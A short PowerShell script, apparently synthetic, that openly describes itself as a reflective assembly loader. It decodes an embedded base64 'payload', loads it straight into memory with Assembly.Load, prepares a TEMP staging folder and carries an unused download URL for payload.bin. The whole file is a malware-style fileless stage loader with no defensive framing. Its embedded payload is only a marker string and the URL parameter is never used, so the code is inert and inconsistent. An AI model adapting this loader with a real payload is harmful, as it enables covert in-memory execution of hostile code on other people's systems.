<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://example.com:80/payload.bin",
    [int]$TimeoutSec = 39
)
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo5amloM2xoczE4')
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
